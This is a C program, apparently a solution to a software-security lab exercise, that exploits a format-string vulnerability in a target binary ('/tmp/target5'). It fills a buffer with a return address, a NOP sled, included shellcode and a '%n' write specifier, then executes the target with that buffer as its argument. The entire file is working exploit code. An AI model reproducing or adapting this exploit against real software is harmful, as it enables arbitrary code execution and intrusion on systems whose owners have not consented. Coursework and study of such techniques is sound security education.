#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char *args[3];
  char *env[1];

  //buf size 400
  //snprintf(buf, sizeof buf, arg)
  //shellcode length = 45

  args[0] = TARGET;

  char buf[400];
  
  int i = 0,j = 0;
  int addr = 0xbffffcbd;
  
  //12582463
  char * str = "%012582521u%n";

  for(i = 0; i < 400; i++){
  
    if(i < 4){
      *(buf+i) = addr >> (i * 8);
    }
    
    else if(i < (399 - strlen(str) - strlen(shellcode))){
      *(buf+i) = 0x90;
    }
    
    else if(i < (399 - strlen(str))){
      *(buf+i) = shellcode[j++];
    }
    
    else if(i<399){
      memcpy(buf+i, str, strlen(str));
      i += strlen(str) - 1;
    }
    
    else{
      *(buf+i) = 0x00;
    }
  }

  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
